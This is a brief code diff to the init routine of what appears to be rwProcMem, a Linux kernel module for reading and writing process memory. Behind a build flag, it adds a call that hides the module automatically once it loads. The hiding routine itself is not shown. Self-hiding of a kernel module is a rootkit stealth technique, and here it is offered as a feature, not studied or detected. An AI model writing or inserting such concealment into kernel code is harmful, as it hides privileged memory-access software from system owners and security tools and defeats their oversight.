@@ -419,6 +419,11 @@ static int rwProcMem_dev_init(void) {
 #else
 	printk(KERN_EMERG CONFIG_LOG_PREFIX "Hello\n");
 #endif
+
+#ifdef CONFIG_AUTO_HIDE_MODULE
+	// Best-effort auto hide after init
+	OnCmdHideKernelModule(NULL, NULL);
+#endif
 	return 0;
 }
 
